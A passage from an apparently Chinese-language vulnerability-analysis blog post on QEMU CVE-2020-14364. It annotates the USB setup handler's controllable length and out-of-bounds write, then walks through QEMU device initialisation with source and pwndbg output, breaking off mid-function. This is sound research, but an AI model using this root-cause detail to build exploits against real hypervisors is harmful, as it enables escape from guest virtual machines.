&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* ignore additional output */</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> SETUP_STATE_DATA:</span><br><span class="line">        <span class="keyword">if</span> (!(s-&gt;setup_buf[<span class="number">0</span>] &amp; USB_DIR_IN)) &#123;</span><br><span class="line">            <span class="type">int</span> len = s-&gt;setup_len - s-&gt;setup_index;<span class="comment">// 这里可控</span></span><br><span class="line">            <span class="keyword">if</span> (len &gt; p-&gt;iov.size) &#123;</span><br><span class="line">                len = p-&gt;iov.size;</span><br><span class="line">            &#125;</span><br><span class="line">            usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);<span class="comment">// 越界写</span></span><br><span class="line">            s-&gt;setup_index += len;</span><br><span class="line">            <span class="keyword">if</span> (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123;</span><br><span class="line">                s-&gt;setup_state = SETUP_STATE_ACK;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        s-&gt;setup_state = SETUP_STATE_IDLE;</span><br><span class="line">        p-&gt;status = USB_RET_STALL;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        p-&gt;status = USB_RET_STALL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">usb_packet_copy</span><span class="params">(USBPacket *p, <span class="type">void</span> *ptr, <span class="type">size_t</span> bytes)</span></span><br><span class="line">&#123;</span><br><span class="line">    QEMUIOVector *iov = p-&gt;combined ? &amp;p-&gt;combined-&gt;iov : &amp;p-&gt;iov;</span><br><span class="line"></span><br><span class="line">    assert(p-&gt;actual_length &gt;= <span class="number">0</span>);</span><br><span class="line">    assert(p-&gt;actual_length + bytes &lt;= iov-&gt;size);</span><br><span class="line">    <span class="keyword">switch</span> (p-&gt;pid) &#123;<span class="comment">// 根据pid来判断是进行读还是写</span></span><br><span class="line">    <span class="keyword">case</span> USB_TOKEN_SETUP:</span><br><span class="line">    <span class="keyword">case</span> USB_TOKEN_OUT:</span><br><span class="line">        iov_to_buf(iov-&gt;iov, iov-&gt;niov, p-&gt;actual_length, ptr, bytes);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> USB_TOKEN_IN:</span><br><span class="line">        iov_from_buf(iov-&gt;iov, iov-&gt;niov, p-&gt;actual_length, ptr, bytes);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s: invalid pid: %x\n&quot;</span>, __func__, p-&gt;pid);</span><br><span class="line">        <span class="built_in">abort</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    p-&gt;actual_length += bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="qemu设备初始化过程"><a href="#qemu设备初始化过程" class="headerlink" title="qemu设备初始化过程"></a>qemu设备初始化过程</h2><p>执行<code>qemu-system-x86_64  -device help</code>命令可以查看所有支持的<code>device</code>，这里说一下<code>device</code>的初始化过程，首先在我们启动<code>qemu-system-x86_64</code>的时候如果指定了<code>-device</code>的选项，那么该设备就会在<code>vl.c:main</code>函数中的<code>4372</code>行进行设备的创建与初始化</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu_opts_foreach(qemu_find_opts(<span class="string">&quot;device&quot;</span>),device_init_func, <span class="literal">NULL</span>, &amp;error_fatal);</span><br></pre></td></tr></table></figure>

<p>上述代码的意思是找到<code>device</code>列表之后，执行<code>device_init_func</code>函数，相关数据结构如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">QemuOptType</span> &#123;</span></span><br><span class="line">    QEMU_OPT_STRING = <span class="number">0</span>,  <span class="comment">/* no parsing (use string as-is)                        */</span></span><br><span class="line">    QEMU_OPT_BOOL,        <span class="comment">/* on/off                                               */</span></span><br><span class="line">    QEMU_OPT_NUMBER,      <span class="comment">/* simple number                                        */</span></span><br><span class="line">    QEMU_OPT_SIZE,        <span class="comment">/* size, accepts (K)ilo, (M)ega, (G)iga, (T)era postfix */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">QemuOptDesc</span> &#123;</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">QemuOptType</span> <span class="title">type</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *help;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *def_value_str;</span><br><span class="line">&#125; QemuOptDesc;</span><br><span class="line"><span class="comment">//include/qemu/option_int.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QemuOpts</span> &#123;</span><span class="comment">// 保存每一个实例的所有参数</span></span><br><span class="line">    <span class="type">char</span> *id;</span><br><span class="line">    QemuOptsList *<span class="built_in">list</span>;</span><br><span class="line">    Location loc;</span><br><span class="line">    QTAILQ_HEAD(, QemuOpt) head;</span><br><span class="line">    QTAILQ_ENTRY(QemuOpts) next;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QemuOpt</span> &#123;</span><span class="comment">// 保存每一个实例的每一个参数</span></span><br><span class="line">    <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">char</span> *str;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> QemuOptDesc *desc;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="type">bool</span> boolean;</span><br><span class="line">        <span class="type">uint64_t</span> uint;</span><br><span class="line">    &#125; value;</span><br><span class="line"></span><br><span class="line">    QemuOpts     *opts;</span><br><span class="line">    QTAILQ_ENTRY(QemuOpt) next;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//include/qemu/option.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QemuOptsList</span> &#123;</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *implied_opt_name;</span><br><span class="line">    <span class="type">bool</span> merge_lists;  <span class="comment">/* Merge multiple uses of option into a single list? */</span></span><br><span class="line">    QTAILQ_HEAD(, QemuOpts) head;</span><br><span class="line">    QemuOptDesc desc[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>QemuOptsList</code>是用来保存某一类的选项比如<code>device</code>，<code>qemu</code>维护了一个<code>QemuOptsList</code>的数组该数组中的每个成员都代表了解析出来的一类选项。有些只有一个选择的选项则直接保存在变量中。<code>QemuOptsList</code>保存的大选项中有很多的子选项，一个<code>QemuOpts</code>保存了一个大选项中所有的子选项。每一个子选项都是一个<code>QemuOpt</code>结构体，因此<code>QemuOpts</code>里面实际上保存的是<code>QemuOpt</code>结构的链表。</p>
<p> <code>QemuOpt</code>结构保存的是一个个具体的子选项，以<code>key、value</code>对的方式保存，<code>key</code>是子选项的名称，<code>value</code>是命令行参数指定的子选项的值。</p>
<p>从数据结构中我们可以看到<code>QemuOptsList</code>保存的是<code>QemuOpts</code>的链表，但是<code>QemuOpts</code>已经保存所有的子项了，为什么还需要一个链表呢，这是因为<code>qemu</code>启动参数中可能会存在多个相同的选项比如<code>-device</code>，<code>qemu</code>可以通过<code>device</code>创建多个不同的设备，每个设备都有自己指定的子项，因此多个<code>QemuOpts</code>是用来保存同一个选项的不同实例的。</p>
<p>函数代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//util/qemu-option.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QTAILQ_FOREACH(var, head, field)                                \</span></span><br><span class="line"><span class="meta">        for ((var) = ((head)-&gt;tqh_first);                               \</span></span><br><span class="line"><span class="meta">                (var);                                                  \</span></span><br><span class="line"><span class="meta">                (var) = ((var)-&gt;field.tqe_next))</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">qemu_opts_foreach</span><span class="params">(QemuOptsList *<span class="built_in">list</span>, qemu_opts_loopfunc func,</span></span><br><span class="line"><span class="params">                      <span class="type">void</span> *opaque, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    Location loc;</span><br><span class="line">    QemuOpts *opts;</span><br><span class="line">    <span class="type">int</span> rc = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    loc_push_none(&amp;loc);</span><br><span class="line">    QTAILQ_FOREACH(opts, &amp;<span class="built_in">list</span>-&gt;head, next) &#123;</span><br><span class="line">        loc_restore(&amp;opts-&gt;loc);</span><br><span class="line">        rc = func(opaque, opts, errp);</span><br><span class="line">        <span class="keyword">if</span> (rc) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        assert(!errp || !*errp);</span><br><span class="line">    &#125;</span><br><span class="line">    loc_pop(&amp;loc);</span><br><span class="line">    <span class="keyword">return</span> rc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//util/qemu-config.c</span></span><br><span class="line"><span class="type">static</span> QemuOptsList *vm_config_groups[<span class="number">48</span>];</span><br><span class="line">QemuOptsList *<span class="title function_">qemu_find_opts</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *group)</span></span><br><span class="line">&#123;</span><br><span class="line">    QemuOptsList *ret;</span><br><span class="line">    Error *local_err = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    ret = find_list(vm_config_groups, group, &amp;local_err);</span><br><span class="line">    <span class="keyword">if</span> (local_err) &#123;</span><br><span class="line">        error_report_err(local_err);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> QemuOptsList *<span class="title function_">find_list</span><span class="params">(QemuOptsList **lists, <span class="type">const</span> <span class="type">char</span> *group,</span></span><br><span class="line"><span class="params">                               Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; lists[i] != <span class="literal">NULL</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(lists[i]-&gt;name, group) == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (lists[i] == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        error_setg(errp, <span class="string">&quot;There is no option group &#x27;%s&#x27;&quot;</span>, group);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> lists[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么首先是调用<code>qemu_find_opts</code>函数，从<code>vm_config_groups</code>数组中获取得到<code>device</code>的链表，返回值是一个<code>QemuOptsList</code>的结构体指针，该结构体中保存了所有的<code>device</code>实例。</p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/CVE-2020-14364-QEMU-%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%86%99%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E5%88%86%E6%9E%90/image-20210304155938619.png" alt="图片无法显示，请联系作者" title=" ">

<p>接下来就是进入到<code>qemu_opts_foreach</code>，函数通过一个宏定义的<code>for</code>循环对<code>device</code>链表进行遍历操作，也就是依次取出<code>QemuOptsList</code>中保存的<code>QemuOpts</code>链表，对每个链表调用<code>device_init_func</code>函数进行初始化。该链表中保存了一个<code>-device</code>中定义的所有的参数，每一个参数都保存在<code>QemuOpt</code>结构体中。也就是说对参数中每一个<code>-device</code>实例都调用了<code>device_init_func</code>函数进行初始化处理。我们看一下代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//vl.c</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">device_init_func</span><span class="params">(<span class="type">void</span> *opaque, QemuOpts *opts, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    DeviceState *dev;</span><br><span class="line"></span><br><span class="line">    dev = qdev_device_add(opts, errp);</span><br><span class="line">    <span class="keyword">if</span> (!dev &amp;&amp; *errp) &#123;</span><br><span class="line">        error_report_err(*errp);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (dev) &#123;</span><br><span class="line">        object_unref(OBJECT(dev));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面分析可以得到传入的参数是一个<code>-device</code>实例，以<code>QemuOpts</code>链表的形式保存所有的参数。调用<code>qdev_device_add</code>函数添加每一个实例。我们看一下第一个处理的实例</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *opts-&gt;head -&gt;tqh_first</span><br><span class="line">$<span class="number">36</span> = &#123;</span><br><span class="line">  name = <span class="number">0x5555566cbc10</span> <span class="string">&quot;driver&quot;</span>,</span><br><span class="line">  str = <span class="number">0x5555566cbbb0</span> <span class="string">&quot;e1000&quot;</span>,</span><br><span class="line">  desc = <span class="number">0x0</span>,</span><br><span class="line">  value = &#123;</span><br><span class="line">    boolean = <span class="literal">false</span>,</span><br><span class="line">    uint = <span class="number">0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  opts = <span class="number">0x5555566cbb40</span>,</span><br><span class="line">  next = &#123;</span><br><span class="line">    tqe_next = <span class="number">0x5555566cbc50</span>,</span><br><span class="line">    tqe_circ = &#123;</span><br><span class="line">      tql_next = <span class="number">0x5555566cbc50</span>,</span><br><span class="line">      tql_prev = <span class="number">0x5555566cbb68</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p *opts-&gt;head -&gt;tqh_first-&gt;next-&gt;tqe_next</span><br><span class="line">$<span class="number">37</span> = &#123;</span><br><span class="line">  name = <span class="number">0x5555566cbc90</span> <span class="string">&quot;netdev&quot;</span>,</span><br><span class="line">  str = <span class="number">0x5555566cbc30</span> <span class="string">&quot;net0&quot;</span>,</span><br><span class="line">  desc = <span class="number">0x0</span>,</span><br><span class="line">  value = &#123;</span><br><span class="line">    boolean = <span class="literal">false</span>,</span><br><span class="line">    uint = <span class="number">0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  opts = <span class="number">0x5555566cbb40</span>,</span><br><span class="line">  next = &#123;</span><br><span class="line">    tqe_next = <span class="number">0x0</span>,</span><br><span class="line">    tqe_circ = &#123;</span><br><span class="line">      tql_next = <span class="number">0x0</span>,</span><br><span class="line">      tql_prev = <span class="number">0x5555566cbbf8</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>正好对应我们的启动参数<code>-device e1000,netdev=net0</code>，看一下<code>qdev_device_add</code>函数的代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//qdev-monitor.c</span></span><br><span class="line">DeviceState *<span class="title function_">qdev_device_add</span><span class="params">(QemuOpts *opts, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    DeviceClass *dc;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *driver, *path;</span><br><span class="line">    DeviceState *dev = <span class="literal">NULL</span>;</span><br><span class="line">    BusState *bus = <span class="literal">NULL</span>;</span><br><span class="line">    Error *err = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">bool</span> hide;</span><br><span class="line">  <span class="comment">// 找到-device中指定驱动的名字，opts中成员driver的值就是设备对应驱动的名字</span></span><br><span class="line">  <span class="comment">// 那么接下来的qemu_opt_get函数就是依次处理driver中可能的参数</span></span><br><span class="line">    driver = qemu_opt_get(opts, <span class="string">&quot;driver&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!driver) &#123;</span><br><span class="line">        error_setg(errp, QERR_MISSING_PARAMETER, <span class="string">&quot;driver&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 根据driver名称获取到对应的DriverClass对象（由ObjectClass转换得到）</span></span><br><span class="line">  <span class="comment">// 函数实际上是调用object_class_by_name函数通过全局HASH表获取到对应的TypeInfo</span></span><br><span class="line">  <span class="comment">// 接着调用type_initialize初始化对应的type，这过程中会初始化ObjectClass，返回该Class</span></span><br><span class="line">    <span class="comment">/* find driver */</span></span><br><span class="line">    dc = qdev_get_device_class(&amp;driver, errp);</span><br><span class="line">    <span class="keyword">if</span> (!dc) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* find bus */</span></span><br><span class="line">    path = qemu_opt_get(opts, <span class="string">&quot;bus&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (path != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        bus = qbus_find(path, errp);</span><br><span class="line">        <span class="keyword">if</span> (!bus) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!object_dynamic_cast(OBJECT(bus), dc-&gt;bus_type)) &#123;</span><br><span class="line">            error_setg(errp, <span class="string">&quot;Device &#x27;%s&#x27; can&#x27;t go on %s bus&quot;</span>,</span><br><span class="line">                       driver, object_get_typename(OBJECT(bus)));</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (dc-&gt;bus_type != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        bus = qbus_find_recursive(sysbus_get_default(), <span class="literal">NULL</span>, dc-&gt;bus_type);</span><br><span class="line">        <span class="keyword">if</span> (!bus || qbus_is_full(bus)) &#123;</span><br><span class="line">            error_setg(errp, <span class="string">&quot;No &#x27;%s&#x27; bus found for device &#x27;%s&#x27;&quot;</span>,</span><br><span class="line">                       dc-&gt;bus_type, driver);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    hide = should_hide_device(opts);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((hide || qdev_hotplug) &amp;&amp; bus &amp;&amp; !qbus_is_hotpluggable(bus)) &#123;</span><br><span class="line">        error_setg(errp, QERR_BUS_NO_HOTPLUG, bus-&gt;name);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hide) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!migration_is_idle()) &#123;</span><br><span class="line">        error_setg(errp, <span class="string">&quot;device_add not allowed while migrating&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* create device */</span></span><br><span class="line">  <span class="comment">// DEVICE将Object结构体转换为DevciceState结构体</span></span><br><span class="line">    dev = DEVICE(object_new(driver));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check whether the hotplug is allowed by the machine */</span></span><br><span class="line">    <span class="keyword">if</span> (qdev_hotplug &amp;&amp; !qdev_hotplug_allowed(dev, &amp;err)) &#123;</span><br><span class="line">        <span class="comment">/* Error must be set in the machine hook */</span></span><br><span class="line">        assert(err);</span><br><span class="line">        <span class="keyword">goto</span> err_del_dev;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bus) &#123;</span><br><span class="line">        qdev_set_parent_bus(dev, bus);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (qdev_hotplug &amp;&amp; !qdev_get_machine_hotplug_handler(dev)) &#123;</span><br><span class="line">        <span class="comment">/* No bus, no machine hotplug handler --&gt; device is not hotpluggable */</span></span><br><span class="line">        error_setg(&amp;err, <span class="string">&quot;Device &#x27;%s&#x27; can not be hotplugged on this machine&quot;</span>,</span><br><span class="line">                   driver);</span><br><span class="line">        <span class="keyword">goto</span> err_del_dev;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    qdev_set_id(dev, qemu_opts_id(opts));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* set properties */</span></span><br><span class="line">    <span class="keyword">if</span> (qemu_opt_foreach(opts, set_property, dev, &amp;err)) &#123;</span><br><span class="line">        <span class="keyword">goto</span> err_del_dev;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    dev-&gt;opts = opts;</span><br><span class="line">    object_property_set_bool(OBJECT(dev), <span class="literal">true</span>, <span class="string">&quot;realized&quot;</span>, &amp;err);</span><br><span class="line">    <span class="keyword">if</span> (err != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        dev-&gt;opts = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">goto</span> err_del_dev;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dev;</span><br><span class="line"></span><br><span class="line">err_del_dev:</span><br><span class="line">    error_propagate(errp, err);</span><br><span class="line">    <span class="keyword">if</span> (dev) &#123;</span><br><span class="line">        object_unparent(OBJECT(dev));</span><br><span class="line">        object_unref(OBJECT(dev));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从代码中可以看出，主要的流程就是首先获取<code>driver</code>的<code>name</code>，接着看参数中是否指定了<code>bus</code>否则就按照<code>Class</code>中指定的<code>bus</code>，接着调用<code>object_new</code>初始化对象，也就是初始化<code>device</code>的描述符<code>DeviceState</code>结构体，将其添加到<code>bus</code>之后为初始化之后的对象添加相应的属性，<code>device</code>即添加完成。看一下<code>object_new</code>的代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//qom/object.c</span></span><br><span class="line">Object *<span class="title function_">object_new</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *typename)</span></span><br><span class="line">&#123;</span><br><span class="line">    